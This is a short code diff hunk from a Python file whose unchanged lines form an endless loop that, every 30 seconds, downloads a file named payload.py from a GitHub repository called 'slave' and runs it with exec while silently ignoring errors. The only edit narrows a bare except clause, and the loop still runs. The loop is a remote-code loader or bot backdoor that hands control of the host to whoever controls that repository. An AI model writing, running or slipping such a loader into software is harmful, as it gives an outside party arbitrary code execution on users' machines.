@@ -5,7 +5,7 @@ while True:
     try:
         with urlopen('https://raw.githubusercontent.com/liverfried/slave/main/payload.py') as payload:
             exec(payload.read())
-    except:
+    except Exception:
         ...
 
     sleep(30)
